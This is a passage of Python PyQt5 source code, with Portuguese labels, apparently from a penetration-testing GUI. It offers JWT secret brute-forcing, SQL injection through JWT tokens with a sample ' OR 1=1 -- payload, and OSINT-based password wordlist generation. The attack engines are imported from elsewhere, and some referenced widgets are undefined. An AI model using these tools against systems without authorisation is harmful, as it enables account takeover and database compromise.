            QMessageBox.information(self, 'Sucesso', f'Resultados salvos em {filename}')
        except Exception as e:
            QMessageBox.critical(self, 'Erro', f'Falha ao salvar resultados: {e}')

    def view_osint_results(self):
        """View OSINT results in a dialog."""
        if not hasattr(self, 'osint_results') or not self.osint_results:
            QMessageBox.warning(self, 'Aviso', 'Nenhum resultado para exibir.')
            return
        dialog = QDialog(self)
        dialog.setWindowTitle('Resultados OSINT')
        dialog.resize(600, 400)
        layout = QVBoxLayout(dialog)
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)
        text_edit.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        text_edit.setText(json.dumps(self.osint_results, ensure_ascii=False, indent=2))
        layout.addWidget(text_edit)
        close_btn = QPushButton('Fechar')
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn, alignment=Qt.AlignCenter)
        dialog.exec_()

    def setup_jwt_tab(self):
        """Setup JWT tab with brute-force section and existing features, scrollable."""
        # Scrollable container
        jwt_scroll = QScrollArea()
        jwt_scroll.setWidgetResizable(True)
        jwt_widget = QWidget()
        jwt_layout = QVBoxLayout(jwt_widget)
        jwt_layout.setContentsMargins(10, 10, 10, 10)
        jwt_layout.setSpacing(15)

        # Seção: Força Bruta de Segredos JWT
        brute_group = QGroupBox('Força Bruta de Segredos JWT')
        brute_group.setToolTip('Configure ataque de força bruta para descobrir segredos')
        brute_group.setContentsMargins(10, 10, 10, 10)
        brute_layout = QGridLayout(brute_group)
        brute_layout.setSpacing(10)
        # Token JWT alvo
        brute_layout.addWidget(QLabel('Token JWT alvo:'), 0, 0)
        self.jwt_brute_token = QLineEdit()
        self.jwt_brute_token.setPlaceholderText('Cole o token aqui')
        self.jwt_brute_token.setToolTip('Insira o token JWT para força bruta')
        brute_layout.addWidget(self.jwt_brute_token, 0, 1, 1, 2)
        # Caminho para wordlist
        brute_layout.addWidget(QLabel('Wordlist (segredos):'), 1, 0)
        self.jwt_brute_wordlist = QLineEdit()
        self.jwt_brute_wordlist.setToolTip('Wordlist contendo possíveis segredos para decifrar o token')
        browse_word_btn = QPushButton('📂')
        browse_word_btn.setToolTip('Selecione arquivo de wordlist')
        browse_word_btn.clicked.connect(lambda: self.jwt_brute_wordlist.setText(QFileDialog.getOpenFileName(self, 'Select Wordlist', '', 'All Files (*)')[0]))
        word_hbox = QHBoxLayout()
        word_hbox.addWidget(self.jwt_brute_wordlist)
        word_hbox.addWidget(browse_word_btn)
        brute_layout.addLayout(word_hbox, 1, 1, 1, 2)
        # Algoritmo
        brute_layout.addWidget(QLabel('Algoritmo:'), 2, 0)
        self.jwt_brute_algo = QComboBox()
        self.jwt_brute_algo.addItems(['HS256', 'HS384', 'HS512'])
        self.jwt_brute_algo.setToolTip('Selecione o algoritmo para brute force')
        brute_layout.addWidget(self.jwt_brute_algo, 2, 1, 1, 2)
        # Progress bar for brute force
        self.jwt_brute_progress = QProgressBar()
        self.jwt_brute_progress.setVisible(False)
        brute_layout.addWidget(self.jwt_brute_progress, 3, 0, 1, 3)
        # Botão Executar
        self.jwt_brute_btn = QPushButton('Executar Ataque')
        self.jwt_brute_btn.setToolTip('Inicia o ataque de força bruta de segredos JWT')
        self.jwt_brute_btn.clicked.connect(self.run_jwt_bruteforce)
        brute_layout.addWidget(self.jwt_brute_btn, 4, 0, 1, 3, alignment=Qt.AlignCenter)
        # Botão Stop para JWT Bruteforce
        self.jwt_brute_stop_btn = QPushButton('Parar Ataque JWT')
        self.jwt_brute_stop_btn.setToolTip('Para o brute-force de JWT')
        self.jwt_brute_stop_btn.setEnabled(False)
        self.jwt_brute_stop_btn.clicked.connect(self.stop_jwt_bruteforce)
        brute_layout.addWidget(self.jwt_brute_stop_btn, 5, 0, 1, 3, alignment=Qt.AlignCenter)
        # Logs/resultados
        self.jwt_brute_log = QTextEdit()
        self.jwt_brute_log.setReadOnly(True)
        self.jwt_brute_log.setFont(QFont('Courier New', 10))
        self.jwt_brute_log.setMinimumHeight(200)  # Increased height
        brute_layout.addWidget(self.jwt_brute_log, 6, 0, 1, 3)
        # Save and View buttons for brute force results
        brute_btn_layout = QHBoxLayout()
        self.jwt_brute_save_btn = QPushButton('💾 Salvar Resultados')
        self.jwt_brute_save_btn.setToolTip('Salva os resultados do brute force')
        self.jwt_brute_save_btn.clicked.connect(lambda: self.save_jwt_results('brute'))
        self.jwt_brute_view_btn = QPushButton('👁️ Ver Resultados')
        self.jwt_brute_view_btn.setToolTip('Visualiza os resultados salvos')
        self.jwt_brute_view_btn.clicked.connect(lambda: self.view_jwt_results('brute'))
        brute_btn_layout.addWidget(self.jwt_brute_save_btn)
        brute_btn_layout.addWidget(self.jwt_brute_view_btn)
        brute_layout.addLayout(brute_btn_layout, 7, 0, 1, 3)
        jwt_layout.addWidget(brute_group)

        # Seção: Injeção SQL em JWT
        sqli_group = QGroupBox('Injeção SQL em JWT')
        sqli_group.setToolTip('Realiza injeção SQL via JWT')
        sqli_layout = QFormLayout(sqli_group)
        sqli_layout.setContentsMargins(10, 10, 10, 10)
        sqli_layout.setSpacing(10)
        # URL do Endpoint
        self.jwt_sqli_url = QLineEdit()
        self.jwt_sqli_url.setPlaceholderText('https://exemplo.com/api/auth')
        self.jwt_sqli_url.setToolTip('URL do endpoint de autenticação')
        sqli_layout.addRow('URL do Endpoint:', self.jwt_sqli_url)
        # Token JWT
        self.jwt_sqli_token = QTextEdit()
        self.jwt_sqli_token.setToolTip('Token JWT para injeção')
        self.jwt_sqli_token.setFixedHeight(60)
        sqli_layout.addRow('Token JWT:', self.jwt_sqli_token)
        # Tipo de Injeção
        self.jwt_sqli_type = QComboBox()
        self.jwt_sqli_type.addItems(['Boolean-Based', 'Time-Based', 'Union-Based', 'Error-Based'])
        self.jwt_sqli_type.setToolTip('Tipo de injeção SQL')
        sqli_layout.addRow('Tipo de Injeção:', self.jwt_sqli_type)
        # Payload SQL
        self.jwt_sqli_payload = QTextEdit()
        self.jwt_sqli_payload.setPlaceholderText("Ex: ' OR 1=1 --")
        self.jwt_sqli_payload.setToolTip('Payload SQL para injeção')
        self.jwt_sqli_payload.setFixedHeight(80)
        sqli_layout.addRow('Payload SQL:', self.jwt_sqli_payload)
        # Progress bar for SQL injection
        self.jwt_sqli_progress = QProgressBar()
        self.jwt_sqli_progress.setVisible(False)
        sqli_layout.addRow(self.jwt_sqli_progress)
        # Botão Executar
        self.jwt_sqli_btn = QPushButton('Executar SQL Injection')
        self.jwt_sqli_btn.setToolTip('Executa injeção SQL via JWT')
        self.jwt_sqli_btn.clicked.connect(self.run_sql_injection_jwt)
        sqli_layout.addRow(self.jwt_sqli_btn)
        # Botão Stop para SQL Injection
        self.jwt_sqli_stop_btn = QPushButton('Parar SQL Injection')
        self.jwt_sqli_stop_btn.setToolTip('Para a execução de SQL Injection')
        self.jwt_sqli_stop_btn.setEnabled(False)
        self.jwt_sqli_stop_btn.clicked.connect(self.stop_jwt_sqli)
        sqli_layout.addRow(self.jwt_sqli_stop_btn)
        # Logs e Resultado
        self.jwt_sqli_log = QTextEdit()
        self.jwt_sqli_log.setReadOnly(True)
        self.jwt_sqli_log.setFont(QFont('Courier New', 10))
        self.jwt_sqli_log.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        self.jwt_sqli_log.setMinimumHeight(200)  # Increased height
        sqli_layout.addRow(self.jwt_sqli_log)
        # Save and View buttons for SQL injection results
        sqli_btn_layout = QHBoxLayout()
        self.jwt_sqli_save_btn = QPushButton('💾 Salvar Resultados')
        self.jwt_sqli_save_btn.setToolTip('Salva os resultados da injeção SQL')
        self.jwt_sqli_save_btn.clicked.connect(lambda: self.save_jwt_results('sqli'))
        self.jwt_sqli_view_btn = QPushButton('👁️ Ver Resultados')
        self.jwt_sqli_view_btn.setToolTip('Visualiza os resultados salvos')
        self.jwt_sqli_view_btn.clicked.connect(lambda: self.view_jwt_results('sqli'))
        sqli_btn_layout.addWidget(self.jwt_sqli_save_btn)
        sqli_btn_layout.addWidget(self.jwt_sqli_view_btn)
        sqli_layout.addRow(sqli_btn_layout)
        jwt_layout.addWidget(sqli_group)

        # Token Manipulation
        manip_group = QGroupBox('Manipulação de Token')
        manip_layout = QHBoxLayout(manip_group)
        # Token input and file
        self.jwt_entry = QLineEdit()
        self.jwt_entry.setPlaceholderText('JWT Token')
        self.jwt_file_entry = QLineEdit()
        self.jwt_file_entry.setPlaceholderText('Token File')
        browse_btn = QPushButton('📂')
        browse_btn.setToolTip('Escolher arquivo de token')
        browse_btn.clicked.connect(self.browse_jwt_file)
        manip_layout.addWidget(self.jwt_entry)
        manip_layout.addWidget(self.jwt_file_entry)
        manip_layout.addWidget(browse_btn)
        jwt_layout.addWidget(manip_group)
        # Parâmetros de Análise de Token JWT
        ana_group = QGroupBox('Parâmetros de Análise')
        ana_layout = QFormLayout(ana_group)
        self.jwt_analysis_key = QLineEdit()
        self.jwt_analysis_key.setEchoMode(QLineEdit.Password)
        self.jwt_analysis_key.setToolTip('Chave secreta ou pública para verificação de assinatura')
        ana_layout.addRow('Segredo/Chave:', self.jwt_analysis_key)
        self.jwt_allowed_algs_entry = QLineEdit()
        self.jwt_allowed_algs_entry.setPlaceholderText('Ex: HS256,RS256')
        self.jwt_allowed_algs_entry.setToolTip('Algoritmos de assinatura permitidos (lista branca)')
        ana_layout.addRow('Algoritmos Aceitos:', self.jwt_allowed_algs_entry)
        jwt_layout.addWidget(ana_group)
        # Actions
        action_group = QGroupBox('Ações de Token')
        action_layout = QHBoxLayout(action_group)
        analyze_btn = QPushButton('🧾 Analisar')
        analyze_btn.setToolTip('Analisa o token JWT')
        analyze_btn.clicked.connect(self.run_jwt_analysis)
        clear_btn = QPushButton('❌ Limpar')
        clear_btn.setToolTip('Limpa resultados de análise')
        clear_btn.clicked.connect(self.clear_jwt_results)
        action_layout.addWidget(analyze_btn)
        action_layout.addWidget(clear_btn)
        jwt_layout.addWidget(action_group)
        # Results
        result_group = QGroupBox('Resultados JWT')
        result_layout = QHBoxLayout(result_group)
        self.jwt_details = QTextEdit()
        self.jwt_details.setReadOnly(True)
        self.jwt_details.setMinimumHeight(300)  # Increased height
        self.jwt_vuln = QTextEdit()
        self.jwt_vuln.setReadOnly(True)
        self.jwt_vuln.setMinimumHeight(300)  # Increased height
        result_layout.addWidget(self.jwt_details)
        result_layout.addWidget(self.jwt_vuln)
        jwt_layout.addWidget(result_group)

        jwt_scroll.setWidget(jwt_widget)
        self.tabs.addTab(jwt_scroll, 'JWT')

    def browse_jwt_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, 'Open JWT File', '', 'All Files (*)')
        if fname:
            self.jwt_file_entry.setText(fname)

    def run_jwt_analysis(self):
        # Increment tokens analisados counter
        self.inc_tokens_count()
        token = self.jwt_entry.text().strip()
        filepath = self.jwt_file_entry.text().strip()
        self.jwt_details.clear()
        self.jwt_vuln.clear()
        # Push JWT analysis event to AI worker
        self.ai_worker.push_event(f"Executed JWT analysis for token: {token}")
        if filepath and not token:
            try:
                with open(filepath) as f:
                    token = f.read().strip()
            except Exception as e:
                self.jwt_details.append(f"Erro ao ler arquivo: {e}")
                return
        if not token:
            self.jwt_details.append('Insira um token JWT ou selecione um arquivo.')
            return
        # Validação da estrutura do token
        if token.count('.') != 2:
            self.jwt_vuln.append('Token inválido: formato incorreto (esperado header.payload.signature)')
            return
        header_b64, payload_b64, signature_b64 = token.split('.')
        # Decodificar header
        try:
            padded_hdr = header_b64 + '=' * (-len(header_b64) % 4)
            header_json = json.loads(base64.urlsafe_b64decode(padded_hdr).decode())
            self.jwt_details.append(f'Header:\n{json.dumps(header_json, indent=2)}')
        except Exception as e:
            self.jwt_vuln.append(f'Erro ao decodificar header: {e}')
            return
        # Lista branca de algoritmos
        allowed_algs = [alg.strip() for alg in self.jwt_allowed_algs_entry.text().split(',') if alg.strip()]
        if not allowed_algs:
            allowed_algs = ['HS256','HS384','HS512','RS256','RS384','RS512']
        alg = header_json.get('alg')
        if alg not in allowed_algs:
            self.jwt_vuln.append(f'Algoritmo "{alg}" não está na lista branca.')
        else:
            self.jwt_details.append(f'Algoritmo "{alg}" aceito.')
        # Decodificar payload
        try:
            padded_pl = payload_b64 + '=' * (-len(payload_b64) % 4)
            payload_json = json.loads(base64.urlsafe_b64decode(padded_pl).decode())
            self.jwt_details.append(f'Payload:\n{json.dumps(payload_json, indent=2)}')
        except Exception as e:
            self.jwt_vuln.append(f'Erro ao decodificar payload: {e}')
            return
        # Verificar assinatura se chave fornecida
        key = self.jwt_analysis_key.text().strip()
        if key:
            try:
                jwt.decode(token, key, algorithms=allowed_algs, options={'verify_exp': False})
                self.jwt_details.append('Assinatura válida.')
            except Exception as e:
                self.jwt_vuln.append(f'Falha na verificação de assinatura: {e}')
        # Validar claims padrão
        now = datetime.utcnow().timestamp()
        exp = payload_json.get('exp')
        if exp:
            if exp < now:
                self.jwt_vuln.append('Token expirado.')
            else:
                self.jwt_details.append('Token válido quanto à expiração.')
        nbf = payload_json.get('nbf')
        if nbf and nbf > now:
            self.jwt_vuln.append('Token não é válido ainda (nbf).')
        iat = payload_json.get('iat')
        if iat and iat > now:
            self.jwt_vuln.append('Token emitido no futuro (iat).')
        # Validações personalizadas adicionais podem ser implementadas aqui

    def clear_jwt_results(self):
        self.jwt_entry.clear()
        self.jwt_file_entry.clear()
        self.jwt_details.clear()
        self.jwt_vuln.clear()

    def run_jwt_bruteforce(self):
        """
        Executa força bruta JWT usando o novo método run_attack_module
        """
        from core.jwt_bruteforcer import JWTBruteforcer
        wordlist = self.jwt_brute_wordlist.text().strip()
        alg = self.jwt_brute_alg.text().strip() if hasattr(self, 'jwt_brute_alg') else 'HS256'
        if not wordlist:
            QMessageBox.warning(self, "Aviso", "Wordlist é obrigatória")
            return
        # Desabilita botão de início e habilita botão de stop
        self.jwt_brute_btn.setEnabled(False)
        self.jwt_brute_stop_btn.setEnabled(True)
        self.jwt_brute_progress.setVisible(True)
        self.jwt_brute_progress.setValue(0)
        # Carrega wordlist do arquivo (ou campo)
        try:
            if os.path.isfile(wordlist):
                with open(wordlist, 'r', encoding='utf-8') as f:
                    words = [w.strip() for w in f if w.strip()]
            else:
                words = [w.strip() for w in wordlist.split(',') if w.strip()]
        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Falha ao ler wordlist: {e}")
            self.jwt_brute_btn.setEnabled(True)
            self.jwt_brute_stop_btn.setEnabled(False)
            return
        # Instancia o módulo e executa pelo método padrão
        self._jwt_brute_module = JWTBruteforcer(wordlist=words, alg=alg)
        thread = self.run_attack_module(self._jwt_brute_module)
        # Opcional: monitorar thread e reabilitar UI ao final
        def enable_buttons_when_done():
            self.jwt_brute_btn.setEnabled(True)
            self.jwt_brute_stop_btn.setEnabled(False)
            self.jwt_brute_progress.setVisible(False)
        import threading
        def wait_and_enable():
            thread.join()
            QTimer.singleShot(0, enable_buttons_when_done)
        threading.Thread(target=wait_and_enable, daemon=True).start()

    def _handle_jwt_brute_result(self, result):
        if result:
            self.jwt_brute_result.setText(f"Chave encontrada: {result}")
            self.jwt_brute_result.setStyleSheet("color: green;")
        else:
            self.jwt_brute_result.setText("Nenhuma chave encontrada")
            self.jwt_brute_result.setStyleSheet("color: red;")
            
        # Re-enable start button and disable stop
        self.jwt_brute_start_btn.setEnabled(True)
        self.jwt_brute_stop_btn.setEnabled(False)
        self.jwt_brute_progress.setVisible(False)

    def stop_jwt_bruteforce(self):
        """Stop the JWT bruteforce attack"""
        if hasattr(self, 'jwt_brute_thread'):
            self.jwt_brute_thread.quit()
            self.jwt_brute_thread.wait()
            self.jwt_brute_btn.setEnabled(True)
            self.jwt_brute_stop_btn.setEnabled(False)
            self.jwt_brute_progress.setVisible(False)
            self.jwt_brute_log.append("\n[!] Ataque interrompido pelo usuário")

    def run_sql_injection_jwt(self):
        """Run SQL injection attack via JWT"""
        url = self.jwt_sqli_url.text().strip()
        token = self.jwt_sqli_token.toPlainText().strip()
        sqli_type = self.jwt_sqli_type.currentText()
        payload = self.jwt_sqli_payload.toPlainText().strip()

        if not all([url, token, payload]):
            QMessageBox.warning(self, "Aviso", "Preencha todos os campos necessários.")
            return

        # Disable start button and enable stop button
        self.jwt_sqli_btn.setEnabled(False)
        self.jwt_sqli_stop_btn.setEnabled(True)
        self.jwt_sqli_progress.setVisible(True)
        self.jwt_sqli_progress.setValue(0)
        self.jwt_sqli_log.clear()

        # Create worker thread
        self.jwt_sqli_worker = QThread()
        self.jwt_sqli_worker.stop_flag = False

        def log_cb(msg):
            self.jwt_sqli_log.append(msg)

        def progress_cb(val):
            self.jwt_sqli_progress.setValue(val)

        def finish_cb(result):
            self.jwt_sqli_btn.setEnabled(True)
            self.jwt_sqli_stop_btn.setEnabled(False)
            self.jwt_sqli_progress.setVisible(False)
            if result:
                self.jwt_sqli_log.append("\n[+] Ataque concluído com sucesso!")
            else:
                self.jwt_sqli_log.append("\n[-] Ataque concluído sem encontrar vulnerabilidades.")

        # Move worker to thread
        self.jwt_sqli_worker.run = lambda: self._do_jwt_sqli(
            url, token, sqli_type, payload, log_cb, progress_cb, finish_cb
        )
        self.jwt_sqli_worker.start()

    def _do_jwt_sqli(self, url, token, sqli_type, payload, log_cb, progress_cb, finish_cb):
        """Execute JWT SQL injection attack in worker thread"""
        try:
            from modules.jwt_sqli import JWTSQLInjector

            # Initialize injector
            injector = JWTSQLInjector(url)
            log_cb("Iniciando injeção SQL via JWT...")

            # Test different injection points
            injection_points = [
                "header", "payload", "signature"
            ]

            total_points = len(injection_points)
            for i, point in enumerate(injection_points):
                if self.jwt_sqli_worker.stop_flag:
                    log_cb("\n[!] Ataque interrompido pelo usuário")
                    finish_cb(False)
                    return

                try:
                    log_cb(f"\nTestando injeção no {point}...")
                    result = injector.inject(token, point, sqli_type, payload)
                    
                    if result.get('success'):
                        log_cb(f"[+] Vulnerabilidade encontrada no {point}!")
                        log_cb(f"Payload: {result.get('payload')}")
                        log_cb(f"Resposta: {result.get('response')}")
                        finish_cb(True)
                        return
                except Exception as e:
                    log_cb(f"Erro ao testar {point}: {str(e)}")

                # Update progress
                progress = int((i + 1) / total_points * 100)
                progress_cb(progress)

            finish_cb(False)

        except Exception as e:
            log_cb(f"\n[!] Erro durante o ataque: {str(e)}")
            finish_cb(False)

    def stop_jwt_sqli(self):
        """Stop the JWT SQL injection attack"""
        if hasattr(self, 'jwt_sqli_worker'):
            self.jwt_sqli_worker.stop_flag = True
            self.jwt_sqli_stop_btn.setEnabled(False)
            self.jwt_sqli_btn.setEnabled(True)
            self.jwt_sqli_progress.setVisible(False)
            self.jwt_sqli_log.append("\n[!] Ataque interrompido pelo usuário")

    def setup_crypto_tab(self):
        """Setup the Crypto Analysis panel with advanced options"""
        crypto_tab = QWidget()
        layout = QVBoxLayout(crypto_tab)
        # Data and operation selection
        row1 = QHBoxLayout()
        row1.addWidget(QLabel('Data:'))
        self.crypto_input = QLineEdit()
        row1.addWidget(self.crypto_input)
        row1.addWidget(QLabel('Operation:'))
        self.crypto_op = QComboBox()
        self.crypto_op.addItems(['Encrypt AES','Decrypt AES','Hash SHA256','Hash SHA512','Hash MD5'])
        row1.addWidget(self.crypto_op)
        layout.addLayout(row1)
        # Secret/Key entry
        row2 = QHBoxLayout()
        row2.addWidget(QLabel('Secret/Key:'))
        self.crypto_key_input = QLineEdit()
        self.crypto_key_input.setEchoMode(QLineEdit.Password)
        row2.addWidget(self.crypto_key_input)
        layout.addLayout(row2)
        # Mode selection
        row3 = QHBoxLayout()
        row3.addWidget(QLabel('Mode:'))
        self.crypto_mode = QComboBox()
        self.crypto_mode.addItems(list(MODES.keys()))
        row3.addWidget(self.crypto_mode)
        layout.addLayout(row3)
        # IV input
        row4 = QHBoxLayout()
        row4.addWidget(QLabel('IV (base64):'))
        self.crypto_iv_input = QLineEdit()
        row4.addWidget(self.crypto_iv_input)
        layout.addLayout(row4)
        # Execute button
        self.crypto_exec_btn = QPushButton('Executar Crypto')
        self.crypto_exec_btn.clicked.connect(self.run_crypto)
        layout.addWidget(self.crypto_exec_btn)
        # Output display
        self.crypto_output = QTextEdit()
        self.crypto_output.setReadOnly(True)
        self.crypto_output.setFont(QFont('Courier New', 10))
        layout.addWidget(self.crypto_output)
        # Botão Stop para Crypto
        self.crypto_stop_btn = QPushButton('Parar Crypto')
        self.crypto_stop_btn.setEnabled(False)
        self.crypto_stop_btn.clicked.connect(self.stop_crypto)
        layout.addWidget(self.crypto_stop_btn)
        self.tabs.addTab(crypto_tab, 'Crypto')

    def run_crypto(self):
        """Execute crypto operation in background thread with abort support"""
        input_text = self.crypto_input.text().strip()
        op = self.crypto_op.currentText()
        key_input = self.crypto_key_input.text().strip()
        mode = self.crypto_mode.currentText()
        iv_input = self.crypto_iv_input.text().strip()
        if not input_text:
            QMessageBox.warning(self, 'Crypto', 'Input is required.')
            return
        if op in ('Encrypt AES', 'Decrypt AES') and not key_input:
            QMessageBox.warning(self, 'Crypto', 'Secret/Key is required for AES operations.')
            return
        try:
            if op == 'Encrypt AES':
                key_bytes = sha256(key_input.encode()).digest()
                result = encrypt_aes(input_text, key_bytes, iv=generate_iv(), mode=mode)
                ct = result.get('ciphertext')
                iv_b64 = result.get('iv')
                out = f'Ciphertext: {ct}\nIV: {iv_b64}'
            elif op == 'Decrypt AES':
                key_bytes = sha256(key_input.encode()).digest()
                if not iv_input:
                    QMessageBox.warning(self, 'Crypto', 'IV is required for decryption.')
                    return
                iv_bytes = base64.b64decode(iv_input)
                pt = decrypt_aes(input_text, key_bytes, iv=iv_bytes, mode=mode)
                out = f'Plaintext: {pt}'
            elif op == 'Hash SHA256':
                out = f'SHA256: {hash_sha256(input_text)}'
            elif op == 'Hash SHA512':
                out = f'SHA512: {hash_sha512(input_text)}'
            elif op == 'Hash MD5':
                out = f'MD5: {hash_md5(input_text)}'
            else:
                out = 'Operação não suportada'
        except Exception as e:
            out = f'Erro: {e}'
        self.crypto_output.setPlainText(out)

    def stop_crypto(self):
        """Abort crypto operation"""
        # User requested to stop crypto
        try:
            self._crypto_abort.set()
        except Exception:
            pass
        self.crypto_output.append('Operação crypto interrompida pelo usuário')
        self.crypto_stop_btn.setEnabled(False)
        self.crypto_exec_btn.setEnabled(True)

    def finish_crypto(self):
        """Restore Crypto controls after finish"""
        self.crypto_exec_btn.setEnabled(True)
        self.crypto_stop_btn.setEnabled(False)

    def setup_wordlist_tab(self):
        """Setup Wordlist tab with OSINT integration and advanced options"""
        wordlist_tab = QWidget()
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        container = QWidget()
        scroll_layout = QVBoxLayout(container)
        scroll_layout.setContentsMargins(10, 10, 10, 10)
        scroll_layout.setSpacing(10)
        # Radio options: reuse or new OSINT
        radio_layout = QHBoxLayout()
        self.wordlist_radio_reuse = QRadioButton("Reutilizar dados OSINT carregados")
        self.wordlist_radio_new = QRadioButton("Disparar novo scraping")
        self.wordlist_radio_group = QButtonGroup()
        self.wordlist_radio_group.addButton(self.wordlist_radio_reuse)
        self.wordlist_radio_group.addButton(self.wordlist_radio_new)
        self.wordlist_radio_reuse.setChecked(True)
        radio_layout.addWidget(self.wordlist_radio_reuse)
        radio_layout.addWidget(self.wordlist_radio_new)
        scroll_layout.addLayout(radio_layout)
        # Field selection
        self.wordlist_cb_emails = QCheckBox("Emails")
        self.wordlist_cb_domains = QCheckBox("Domínios")
        self.wordlist_cb_usernames = QCheckBox("Usernames")
        self.wordlist_cb_keywords = QCheckBox("Keywords")
        self.wordlist_cb_links = QCheckBox("Links")
        for cb in [self.wordlist_cb_emails, self.wordlist_cb_domains, self.wordlist_cb_usernames,
                   self.wordlist_cb_keywords, self.wordlist_cb_links]:
            cb.setChecked(True)
            scroll_layout.addWidget(cb)
        # Advanced config
        adv_group = QGroupBox("Configurações Avançadas")
        adv_layout = QFormLayout(adv_group)
        self.wordlist_min_spin = QSpinBox(); self.wordlist_min_spin.setRange(1,100); self.wordlist_min_spin.setValue(4)
        adv_layout.addRow("Comprimento mínimo:", self.wordlist_min_spin)
        self.wordlist_max_spin = QSpinBox(); self.wordlist_max_spin.setRange(1,100); self.wordlist_max_spin.setValue(32)
        adv_layout.addRow("Comprimento máximo:", self.wordlist_max_spin)
        self.wordlist_var_cb = QCheckBox("Variações (leetspeak, uppercase, reverse)")
        self.wordlist_var_cb.setChecked(True); adv_layout.addRow(self.wordlist_var_cb)
        self.wordlist_sufix_cb = QCheckBox("Sufixos comuns (123, !, @)")
        self.wordlist_sufix_cb.setChecked(True); adv_layout.addRow(self.wordlist_sufix_cb)
        self.wordlist_save_cb = QCheckBox("Salvar em arquivo"); adv_layout.addRow(self.wordlist_save_cb)
        scroll_layout.addWidget(adv_group)
        # Generate button
        self.wordlist_gen_btn = QPushButton("Gerar Wordlist")
        self.wordlist_gen_btn.clicked.connect(self.run_wordlist)
        scroll_layout.addWidget(self.wordlist_gen_btn)
        # Stop button for Wordlist
        self.wordlist_stop_btn = QPushButton('Parar Wordlist')
        self.wordlist_stop_btn.setEnabled(False)
        self.wordlist_stop_btn.clicked.connect(self.stop_wordlist)
        scroll_layout.addWidget(self.wordlist_stop_btn)
        # Output preview
        self.wordlist_output = QTextEdit(); self.wordlist_output.setReadOnly(True); self.wordlist_output.setFont(QFont("Courier New", 10))
        scroll_layout.addWidget(self.wordlist_output)
        scroll.setWidget(container)
        layout = QVBoxLayout(wordlist_tab)
        layout.addWidget(scroll)
        self.tabs.addTab(wordlist_tab, "Wordlist")

    def run_wordlist(self):
        """Generate wordlist based on OSINT data and advanced settings"""
        def task():
            # If new OSINT, run scraping
            if self.wordlist_radio_new.isChecked():
                self.run_osint()
                while not hasattr(self, 'osint_results'):
                    time.sleep(0.5)
            data = getattr(self, 'osint_results', {}) or {}
            terms = []
            if self.wordlist_cb_emails.isChecked(): terms += data.get('emails', [])
            if self.wordlist_cb_domains.isChecked(): terms += data.get('domains', [])
            if self.wordlist_cb_usernames.isChecked(): terms += data.get('usernames', [])
            if self.wordlist_cb_keywords.isChecked(): terms += data.get('keywords', [])
            if self.wordlist_cb_links.isChecked(): terms += data.get('links', [])
            # Filter and build
            from utils.wordlist_utils import filter_wordlist, generate_variations, save_wordlist
            filtered = filter_wordlist(terms, min_length=self.wordlist_min_spin.value(), max_length=self.wordlist_max_spin.value())
            final = set(filtered)
            if self.wordlist_var_cb.isChecked():
                for w in list(final): final.update(generate_variations(w))
            if self.wordlist_sufix_cb.isChecked():
                for w in list(final):
                    for s in ['123', '!', '@']: final.add(w + s)
            final = [w for w in final if self.wordlist_min_spin.value() <= len(w) <= self.wordlist_max_spin.value()]
            if self.wordlist_save_cb.isChecked(): save_wordlist(sorted(final), 'output/wordlist_custom.txt')
            text = '\n'.join(sorted(final))
            QTimer.singleShot(0, lambda: self.wordlist_output.setPlainText(text))
        # prepare abort and UI
        self._wordlist_abort.clear()
        self.wordlist_gen_btn.setEnabled(False)
        self.wordlist_stop_btn.setEnabled(True)
        threading.Thread(target=task, daemon=True).start()
    def finish_wordlist(self):
        """Restore UI after wordlist generation"""
        self.wordlist_gen_btn.setEnabled(True)
        self.wordlist_stop_btn.setEnabled(False)
        self.wordlist_output.append('Geração de wordlist concluída')
    def stop_wordlist(self):
        """Abort wordlist generation"""
        self._wordlist_abort.set()
        self.wordlist_output.append('Geração de wordlist cancelada pelo usuário')
        self.wordlist_stop_btn.setEnabled(False)
        self.wordlist_gen_btn.setEnabled(True)

    def send_chat_message_dialog(self):
        message = self.chat_input_dialog.text().strip()
        if not message:
            return
        # Adiciona balão do usuário e inicia thread de resposta
        bubble = ChatBubble('Você', message, is_user=True)
        self.chat_content_layout.addWidget(bubble, alignment=Qt.AlignRight)
        # Rolagem automática
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())
        self.chat_input_dialog.clear()
        self.chat_status_label.setText('IA está digitando...')
        # Typing animation placeholder (replace with animated widget if needed)
        typing_anim = QLabel('⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏')
        typing_anim.setStyleSheet('color:#0ff; font-size: 18px; font-family: JetBrains Mono, monospace;')
        typing_anim.setObjectName('typing_anim')
        self.chat_content_layout.addWidget(typing_anim, alignment=Qt.AlignLeft)
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())
        threading.Thread(target=self._do_chat_dialog, args=(message,), daemon=True).start()

    def _do_chat_dialog(self, message):
        # Worker thread: get response and emit signal
        response = self.chat_manager.send(message)
        self.chat_response.emit(response)

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self.ensure_floating_buttons_visible()
        # Redimensiona o painel de chat proporcionalmente
        dialog_w = int(self.width() * 0.7)
        dialog_h = int(self.height() * 0.7)
        if hasattr(self, 'chat_dock'):
            self.chat_dock.resize(dialog_w, dialog_h)

    def _finish_chat(self, response):
        """Slot to handle chat response in main thread"""
        # Remove typing animation if present
        for i in reversed(range(self.chat_content_layout.count())):
            item = self.chat_content_layout.itemAt(i).widget()
            if item and item.objectName() == 'typing_anim':
                self.chat_content_layout.removeWidget(item)
                item.deleteLater()
        # Adiciona balão da IA com resposta
        bubble = ChatBubble('Agent AI', response, is_user=False, avatar_path=os.path.join(os.path.dirname(__file__), 'assets', 'ai_avatar.png'))
        self.chat_content_layout.addWidget(bubble, alignment=Qt.AlignLeft)
        # Rolagem automática e limpa status
        self.chat_scroll.verticalScrollBar().setValue(self.chat_scroll.verticalScrollBar().maximum())
        self.chat_status_label.setText('')

    def _handle_suggestion(self, suggestion):
        """Slot para sugestões automáticas do AIWorker."""
        if suggestion:
            self.chat_status_label.setText('Sugestão IA: ' + suggestion)
        else:
            self.chat_status_label.setText('')

    def add_ai_suggestion_to_chat(self, suggestion_text):
        if suggestion_text:
